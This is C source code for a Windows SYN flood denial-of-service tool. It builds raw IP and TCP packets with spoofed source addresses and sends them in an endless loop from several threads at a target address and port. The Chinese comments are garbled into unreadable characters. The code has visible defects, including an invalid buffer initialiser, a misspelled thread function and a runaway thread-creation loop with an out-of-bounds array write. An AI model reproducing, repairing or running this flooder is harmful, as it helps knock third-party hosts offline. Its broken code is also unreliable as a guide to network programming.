//gcc ddos-windows.c -lws2_32
#include <windows.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib,"WS2_32.LIB") 

typedef struct tag_ip_Header//ip�ײ� 
{ 
unsigned char h_verlen;//4λ�ֲ����ȣ���4λIP�汾�� 
unsigned char tos;//8λ���ͷ��� 
unsigned short total_len;//16λ�ܳ��� 
unsigned short ident;//16λ��־ 
unsigned short frag_and_flags;//3λ��־λ����SYN,ACK,�ȵ�) 
unsigned char ttl;//8λ����ʱ�� 
unsigned char proto;//8λЭ�� 
unsigned short checksum;//ip�ֲ�Ч��� 
unsigned int SourceIP;//α��IP��ַ 
unsigned int DestIP;//������ip��ַ 
}IPHEADER; 

typedef struct tag_tcp_Header 
{ 
USHORT th_sport;//α��˿� 
USHORT th_dport;//�����˿� 
unsigned int th_seq;//32λϵ�к� 
unsigned int th_ack;//32λȷ�Ϻ� 
unsigned char th_lenres;//4λ�ײ����ȣ�6λ������ 
unsigned char th_flag;//6λ��־λ 
USHORT th_win;//16λ���ڴ�С 
USHORT th_sum;//16λЧ��� 
USHORT th_urp;// 
}TCPHEADER; 

typedef struct tag_tsd_Header 
{ 
unsigned long saddr;//α���ַ 
unsigned long daddr;//������ַ 
char mbz;// 
char ptcl;//Э������ 
unsigned short tcpl;//TCP���� 
}TSDHEADER; 

DWORD WINAPI Start(void); 
HANDLE hFind[10]; 

//����Ч��� 
USHORT checksum(USHORT *buffer,int size) 
{ 
unsigned long check=0; 
while(size>1) 
{ 
check+=*buffer++; 
size -=sizeof(USHORT); 
} 
if(size) 
{ 
check += *(USHORT*)buffer; 
} 
check = (check >>16) + (check & 0xffff); 
check += (check >>16); 
return (USHORT)(~check); 
} 
//�����߳� 
DWORD WINAPI Statr(void) 
{ 
SOCKET sock; 
WSADATA WSAData; 
SOCKADDR_IN syn_in; 
IPHEADER ipHeader; 
TCPHEADER tcpHeader; 
TSDHEADER psdHeader; 
const char *addr = "127.0.0.1";//������IP��ַ 
int port = 135;//Ҫ�����Ķ˿� 
if(WSAStartup(MAKEWORD(2,2),&WSAData)) 
{ 
return false; 
} 
if((sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET) 
{ 
return false; 
} 
BOOL flag=true; 
if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char*)&flag,sizeof(flag))==SOCKET_ERROR) 
{ 
return false; 
} 
int Time =888; 
if(setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&Time,sizeof(Time))==SOCKET_ERROR) 
{ 
return false; 
} 
syn_in.sin_family = AF_INET; 
syn_in.sin_port = htons(port); 
syn_in.sin_addr.S_un.S_addr = inet_addr(addr); 
while(TRUE) 
{ 
//���IP�ײ� 
ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
ipHeader.tos=0; 
ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
ipHeader.ident=1; 
ipHeader.frag_and_flags=0; 
ipHeader.ttl=(unsigned char)GetTickCount()%514+620; 
ipHeader.proto=IPPROTO_TCP; 
ipHeader.checksum=0; 
ipHeader.SourceIP=htonl(GetTickCount()*1986); 
ipHeader.DestIP=inet_addr(addr); 
//���Tcp�ײ� 
int SourcePort =GetTickCount()*1986%514; 
tcpHeader.th_dport=htons(port); 
tcpHeader.th_sport=htons(SourcePort); 
tcpHeader.th_seq=htonl(0x12345678); 
tcpHeader.th_ack=0; 
tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
tcpHeader.th_flag=2; 
tcpHeader.th_win=htons(620); 
tcpHeader.th_urp=0; 
tcpHeader.th_sum=0; 
//���TCPα�ײ���������TCPͷ����Ч��� 
psdHeader.saddr=ipHeader.SourceIP; 
psdHeader.daddr=ipHeader.DestIP; 
psdHeader.mbz=0; 
psdHeader.ptcl=IPPROTO_TCP; 
psdHeader.tcpl=htons(sizeof(tcpHeader)); 

//����У��� 
char SendBuff[100]=; 
memcpy(SendBuff, &psdHeader, sizeof(psdHeader)); 
memcpy(SendBuff+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
tcpHeader.th_sum=checksum((USHORT *)SendBuff,sizeof(psdHeader)+sizeof(tcpHeader)); 
memcpy(SendBuff, &ipHeader, sizeof(ipHeader)); 
memcpy(SendBuff+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 

//�������ݰ� 
int Syn=sendto(sock, SendBuff, sizeof(ipHeader)+sizeof(tcpHeader), 0, (struct sockaddr*)&syn_in, sizeof(syn_in)); 
if(Syn==SOCKET_ERROR) 
{ 
return false; 
} 
} 
closesocket(sock); 
WSACleanup(); 
return true; 
} 

int APIENTRY WinMain(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, 
int nCmdShow) 
{ //�����̣߳�10����ҿ����Լ��� 
for(int i=0;i<10;i++) 
{ 
hFind[i-1]=createThread(NULL,0,(LPTHREAD_START_ROUTINE)Statr,0,0,NULL); 
i--; 
} 
return 0; 
} 

